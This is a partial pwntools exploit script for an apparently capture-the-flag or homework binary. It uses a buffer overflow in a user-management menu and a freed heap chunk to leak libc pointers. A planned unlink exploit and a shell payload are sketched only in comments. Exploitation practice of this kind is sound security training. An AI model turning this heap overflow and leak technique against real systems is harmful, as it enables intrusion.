#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host homework --port 1337 ./homework
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './homework')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'homework'
port = int(args.PORT or 1337)

# Use the specified remote libc version unless explicitly told to use the
# local system version with the `LOCAL_LIBC` argument.
# ./exploit.py LOCAL LOCAL_LIBC
if args.LOCAL_LIBC:
    libc = exe.libc
elif args.LOCAL:
    library_path = libcdb.download_libraries('libc-2.23.so')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('libc-2.23.so')
else:
    libc = ELF('libc-2.23.so')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break free
continue
'''.format(**locals())

'''
set disable-randomization on
tbreak *0x{exe.entry:x}
'''

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)

def select_option(option, wait=True):
    if wait:
        io.recvuntil(b"Choice: ")
    io.sendline(str(option).encode())
    
def register_user(username, password, wait=True):
    select_option(0, wait=wait) 
    io.recvuntil(b"username: ")
    io.sendline(username)
    io.recvuntil(b"password: ")
    io.sendline(password)
    
def switch_user(index, wait=True):
    select_option(1, wait=wait) 
    io.recvuntil(b"[0-15]: ")
    io.sendline(index)
    
def delete_user(wait=True):
    select_option(4, wait=wait)
    
def edit_user(newName, newPassword, wait=True):
    select_option(2, wait=wait)
    io.recvuntil(b"new name: ")
    io.sendline(newName)
    io.recvuntil(b"new password: ")
    io.sendline(newPassword)

def show_user(wait=True):
    select_option(3, wait=wait)


# contig and execution
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'
context.arch = 'amd64'
context.bits = 64
io = start()

# register and login
username = b"user1"
password = b"pass1"
register_user(username, password)
username = b"user2"
password = b"pass2"
register_user(username, password)
username = b"user3"
password = b"pass3"
register_user(username, password)

# leak pie base
switch_user(b'1')
delete_user()
# now there a two libc pointers in the chunk of user2
# use buffer overflow in user1 to get libc leak
switch_user(b'0')
attack = b'A' * 0x50
edit_user(b'user1', attack)
show_user()
raw_leak = io.recvuntil(b"Choice: ")
print(raw_leak)

# do unlink exploit
# configure user1 for exploit

# trigger exploit
#switch_user(b'1')
#delete_user()
#switch_user(b'0')



# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

#io.interactive()